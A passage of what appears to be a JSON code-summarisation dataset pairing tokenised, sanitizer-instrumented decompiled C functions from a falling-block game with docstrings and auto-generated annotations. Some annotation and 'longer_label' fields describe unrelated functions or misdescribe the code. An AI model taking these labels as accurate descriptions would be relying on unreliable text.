            "(",
            "&",
            "g",
            "-",
            ">",
            "shape",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_22F180",
            ",",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E500",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E540",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E580",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "v4",
            "=",
            "y",
            "+",
            "i",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "y",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22E840",
            ",",
            "i",
            ",",
            "y",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E5E0",
            ",",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E620",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "v6",
            "=",
            "x",
            "+",
            "j",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "x",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22E880",
            ",",
            "j",
            ",",
            "x",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v6",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E680",
            ",",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E6C0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E720",
            ",",
            "g",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v4",
            "]",
            "[",
            "v6",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "(",
            "16",
            "*",
            "(",
            "v6",
            "+",
            "10",
            "*",
            "v4",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v7",
            "&",
            "&",
            "v7",
            "!",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v4",
            "]",
            "[",
            "v6",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "|",
            "|",
            "v9",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "v6",
            "+",
            "10",
            "*",
            "v4",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "19",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v9",
            ")",
            "__asan_report_store_n",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "v4",
            "]",
            "[",
            "v6",
            "]",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "v10",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "shape",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "v11",
            "=",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "95",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v10",
            "&",
            "&",
            "v10",
            "!",
            "=",
            "0",
            ";",
            "v12",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "shape",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "+",
            "3",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v11",
            "|",
            "|",
            "v12",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "95",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "19",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v12",
            ")",
            "__asan_report_load_n",
            "(",
            "&",
            "g",
            "-",
            ">",
            "shape",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "v13",
            "=",
            "&",
            "g",
            "-",
            ">",
            "ls",
            "+",
            "40",
            "*",
            "v4",
            "+",
            "4",
            "*",
            "v6",
            ";",
            "p_b",
            "=",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "15",
            "]",
            "[",
            "4",
            "*",
            "i",
            "+",
            "9",
            "+",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ";",
            "v15",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "p_b",
            "+",
            "3",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v13",
            "+",
            "1",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "p_b",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v13",
            "+",
            "3",
            ")",
            "=",
            "v15",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22E8C0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22E900",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The _handle_type function appears to handle the cleanup of a linked list of Namespace_List_Type elements, freeing memory associated with each node, while the free_handle_type function frees memory associated with a Handle_Type struct, including its module_name member.",
            "The \"mismatch\" function likely handles various types of mismatches or errors, such as bracket mismatches in brainfuck code compilation, endianness mismatches when reading data files, or version mismatches in RPC (Remote Procedure Call) communications, and possibly more, as indicated by the diverse code snippets provided.",
            "",
            "The `handle` function seems to be a part of a larger system, possibly related to handling mouse input data, creating interception contexts, and potentially dealing with error codes and UTF-8 mechanisms within some system or application."
        ],
        "longer_label": "The provided code defines a function named `append` which iterates over elements of a game structure, performing various checks and operations on its attributes, possibly related to memory access and bounds checking, with annotations referencing functions that handle type mismatches and memory deallocation in a linked list and a struct."
    },
    {
        "id": 219,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "if",
            "the",
            "game",
            "object",
            "can",
            "move",
            "down",
            "and",
            "updates",
            "its",
            "position",
            "accordingly",
            ",",
            "returning",
            "true",
            "if",
            "there",
            "is",
            "a",
            "collision",
            "."
        ],
        "code_tokens": [
            "bool",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "y",
            ";",
            "bool",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "x",
            ";",
            "int",
            "m",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E940",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "v2",
            "=",
            "__OFADD__",
            "(",
            "1",
            ",",
            "y",
            ")",
            ";",
            "v3",
            "=",
            "y",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22EB80",
            ",",
            "g",
            "-",
            ">",
            "y",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v4",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E9A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "g",
            "-",
            ">",
            "x",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EA00",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "g",
            "-",
            ">",
            "m",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EA60",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "colision",
            "(",
            "g",
            "-",
            ">",
            "n",
            ",",
            "m",
            ",",
            "x",
            ",",
            "v4",
            ",",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "grid",
            ")",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EAC0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "g",
            "-",
            ">",
            "y",
            ";",
            "v2",
            "=",
            "__OFADD__",
            "(",
            "1",
            ",",
            "v7",
            ")",
            ";",
            "v8",
            "=",
            "v7",
            "+",
            "1",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22EBC0",
            ",",
            "g",
            "-",
            ">",
            "y",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EB20",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "y",
            "=",
            "v8",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `san_handle` appears to be a part of a system handling error conditions and violations, including handling overflow, alignment assumptions, and unrecoverable errors, with support for abort variants for each error type.",
            "The function \"mismatch\" is likely used for handling various types of mismatches or errors, such as bracket mismatches in a brainfuck compiler, discrepancies in endianness or machine architecture, and mismatches in RPC versions, program versions, or system calls, among others.",
            "The \"report\" function likely serves to output debug or profiling information related to garbage collection in a Ruby implementation, encapsulating logic for conditional reporting and formatting.",
            "The `handle` function appears to be part of a larger codebase, involving structures for mouse input data, error code mappings, and explanations of UTF-8 mechanisms, suggesting it's likely a utility function within a software project, possibly related to handling input devices, error handling, and character encoding management.",
            "",
            "The function `san_handle_type` appears to be part of a codebase implementing runtime type checking and handling for various type mismatches and overflows, likely as part of a sanitizer tool, ensuring code integrity and preventing runtime errors."
        ],
        "longer_label": "The provided code appears to be a low-level function that handles overflow, alignment assumptions, and type mismatches, while also reporting debug or profiling information."
    },
    {
        "id": 220,
        "docstring_tokens": [
            "The",
            "function",
            "checks",
            "if",
            "all",
            "elements",
            "in",
            "a",
            "grid",
            "of",
            "a",
            "game",
            "have",
            "a",
            "state",
            "of",
            "true",
            "and",
            "a",
            "color",
            "of",
            "RGB",
            "(",
            "186,186,186",
            ")",
            "to",
            "determine",
            "if",
            "the",
            "level",
            "is",
            "completed",
            "."
        ],
        "code_tokens": [
            "bool",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "bool",
            "v2",
            ";",
            "char",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "char",
            "v5",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EFE0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            ">",
            "=",
            "g",
            "-",
            ">",
            "n",
            ")",
            "break",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EF80",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "if",
            "(",
            "j",
            ">",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EC00",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EC40",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EC80",
            ",",
            "g",
            ")",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v1",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_22F1C0",
            ",",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22ECE0",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22ED20",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22ED60",
            ",",
            "g",
            ")",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v3",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ")",
            ";",
            "if",
            "(",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "r",
            "=",
            "=",
            "186",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EDC0",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EE00",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EE40",
            ",",
            "g",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
